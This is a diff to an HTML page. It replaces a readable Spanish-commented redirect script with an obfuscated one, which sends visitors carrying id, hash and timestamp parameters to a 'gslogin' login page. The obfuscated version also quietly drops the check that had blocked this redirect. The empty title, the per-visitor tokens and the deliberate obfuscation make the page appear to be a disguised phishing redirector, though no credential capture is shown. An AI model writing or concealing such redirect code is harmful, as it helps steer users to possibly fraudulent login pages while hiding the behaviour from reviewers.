@@ -7,67 +7,7 @@
   <title></title>
 
   <script>
-(() => {
-  'use strict';
-
-  // Actualizables mediante preparar_github.py.
-  const DESTINATION = 'https://gslogin.gsgrupo.org/index.php';
-  const URL_ALTERNATIVA = 'https://gsgrupo.com/';
-
-  function parametrosValidos() {
-    const entrada = new URLSearchParams(window.location.search);
-
-    const reglas = {
-      id: /^[A-Za-z0-9_\-=]{1,1024}$/,
-      v: /^[a-f0-9]{32}$/,
-      t: /^[0-9]{1,12}$/
-    };
-
-    const salida = new URLSearchParams();
-
-    for (const [nombre, regla] of Object.entries(reglas)) {
-      const valores = entrada.getAll(nombre);
-
-      if (valores.length !== 1 || !regla.test(valores[0])) {
-        return null;
-      }
-
-      salida.set(nombre, valores[0]);
-    }
-
-    return salida;
-  }
-
-  let destino = URL_ALTERNATIVA;
-
-  try {
-    const parametros = parametrosValidos();
-
-    if (parametros) {
-      const url = new URL(DESTINATION);
-
-      if (
-        url.protocol !== 'https:' ||
-        url.username ||
-        url.password ||
-        url.hostname === 'example' ||
-        url.hostname.endsWith('.example') ||
-        url.pathname !== '/' ||
-        url.search ||
-        url.hash
-      ) {
-        throw new Error();
-      }
-
-      url.search = parametros.toString();
-      destino = url.href;
-    }
-  } catch {
-    destino = URL_ALTERNATIVA;
-  }
-
-  window.location.replace(destino);
-})();
+function _0x1af7(){const _0x22ce8e=['example','36reKGUJ','hostname','.example','335802zHfVTO','4706824zzvNmQ','5396550QEPMrC','password','hash','entries','13442112DYjyfG','search','https:','8iwEbDG','href','5314022GKoQBH','location','165LoTyGl','toString','11HzYSFc','9hYHnhS','length','4054dFxNTg','username','760785ggzqSX','endsWith','https://gsgrupo.com/','https://gslogin.gsgrupo.org/index.php','test'];_0x1af7=function(){return _0x22ce8e;};return _0x1af7();}function _0x2e78(_0x1b252d,_0x5cc17f){_0x1b252d=_0x1b252d-0xa2;const _0x1af7a5=_0x1af7();let _0x2e7856=_0x1af7a5[_0x1b252d];return _0x2e7856;}(function(_0x586428,_0x17cfda){const _0x45c66b=_0x2e78,_0x4312f6=_0x586428();while(!![]){try{const _0x5a7b24=-parseInt(_0x45c66b(0xa7))/0x1*(parseInt(_0x45c66b(0xac))/0x2)+parseInt(_0x45c66b(0xb7))/0x3*(parseInt(_0x45c66b(0xa3))/0x4)+-parseInt(_0x45c66b(0xae))/0x5*(parseInt(_0x45c66b(0xb4))/0x6)+-parseInt(_0x45c66b(0xa5))/0x7+-parseInt(_0x45c66b(0xb8))/0x8*(-parseInt(_0x45c66b(0xaa))/0x9)+parseInt(_0x45c66b(0xb9))/0xa+-parseInt(_0x45c66b(0xa9))/0xb*(-parseInt(_0x45c66b(0xbd))/0xc);if(_0x5a7b24===_0x17cfda)break;else _0x4312f6['push'](_0x4312f6['shift']());}catch(_0x57a634){_0x4312f6['push'](_0x4312f6['shift']());}}}(_0x1af7,0x71a65),((()=>{'use strict';const _0x585f4b=_0x2e78;const _0x4b46b6=_0x585f4b(0xb1),_0xd715b=_0x585f4b(0xb0);function _0x80e46e(){const _0x1ace7a=_0x585f4b,_0x3b3963=new URLSearchParams(window[_0x1ace7a(0xa6)]['search']),_0x12b071={'id':/^[A-Za-z0-9_\-=]{1,1024}$/,'v':/^[a-f0-9]{32}$/,'t':/^[0-9]{1,12}$/},_0x3fdac2=new URLSearchParams();for(const [_0x4c36bb,_0xb94d0c]of Object[_0x1ace7a(0xbc)](_0x12b071)){const _0x3fe11f=_0x3b3963['getAll'](_0x4c36bb);if(_0x3fe11f[_0x1ace7a(0xab)]!==0x1||!_0xb94d0c[_0x1ace7a(0xb2)](_0x3fe11f[0x0]))return null;_0x3fdac2['set'](_0x4c36bb,_0x3fe11f[0x0]);}return _0x3fdac2;}let _0x4c0874=_0xd715b;try{const _0x5de760=_0x80e46e();if(_0x5de760){const _0x199721=new URL(_0x4b46b6);if(_0x199721['protocol']!==_0x585f4b(0xa2)||_0x199721[_0x585f4b(0xad)]||_0x199721[_0x585f4b(0xba)]||_0x199721[_0x585f4b(0xb5)]===_0x585f4b(0xb3)||_0x199721[_0x585f4b(0xb5)][_0x585f4b(0xaf)](_0x585f4b(0xb6))||_0x199721[_0x585f4b(0xbe)]||_0x199721[_0x585f4b(0xbb)])throw new Error();_0x199721[_0x585f4b(0xbe)]=_0x5de760[_0x585f4b(0xa8)](),_0x4c0874=_0x199721[_0x585f4b(0xa4)];}}catch{_0x4c0874=_0xd715b;}window[_0x585f4b(0xa6)]['replace'](_0x4c0874);})()));
   </script>
 
   <noscript>
